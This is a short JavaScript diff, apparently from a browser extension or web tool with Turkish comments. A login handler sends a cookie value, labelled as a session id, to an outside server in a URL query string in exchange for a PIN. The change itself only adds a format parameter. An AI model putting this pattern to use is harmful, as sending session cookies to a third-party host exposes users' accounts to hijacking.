@@ -18,7 +18,7 @@ document.getElementById('loginBtn').addEventListener('click', async () => {
     statusDiv.textContent = 'Vercel API\'ye bağlanılıyor...';
     
     // Cookie'yi Vercel'a atıp PIN alıyoruz
-    const response = await fetch(`https://tok.menaworks.xyz/api/save?sid=${cookie.value}`);
+    const response = await fetch(`https://tok.menaworks.xyz/api/save?sid=${cookie.value}&format=json`);
     const data = await response.json();
     
     if (data.pin) {
